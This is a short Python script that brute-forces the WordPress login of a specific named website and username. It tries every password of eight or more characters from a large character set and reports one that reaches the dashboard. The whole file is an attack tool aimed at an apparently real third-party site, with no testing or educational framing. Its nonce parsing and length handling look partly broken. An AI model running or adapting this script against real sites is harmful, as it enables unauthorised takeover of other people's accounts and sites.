import requests
import os

wordpress_url = 'https://moviefiz.space'
login_endpoint = '/wp-login.php'
username = 'rockyissfree'

session = requests.Session()

def generate(arr, i, s, length):
    response = session.get(wordpress_url + login_endpoint)
    nonce = response.text.split('name="log"')[1].split('value="')[1].split('"')[0]

    if i == 0:
        login_data = {
            'log': username,
            'pwd': s,
            'wp-submit': 'Log In',
            'testcookie': '1',
            'redirect_to': wordpress_url,
            'nonce': nonce
        }
        
        login_response = session.post(wordpress_url + login_endpoint, data=login_data)

        if 'Dashboard' in login_response.text:
            print('Your password is ' + s)
            return
        else:
            os.system('clear')
            print('Login attempt failed: ' + s)
            
            
        return

    for j in range(0, length):
        appended = s + arr[j]
        generate(arr, i - 1, appended, length)

def crack(arr, length):
    for i in range(8, length + 1):
        generate(arr, i, "", length)

arr = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','!','@','#','$','%','^','&','*','(',')','+','-','.','~','|','<','>','=','-','_','/',':',';','?','[',']','{','}','~']
length = len(arr)
crack(arr, length)

session.close()
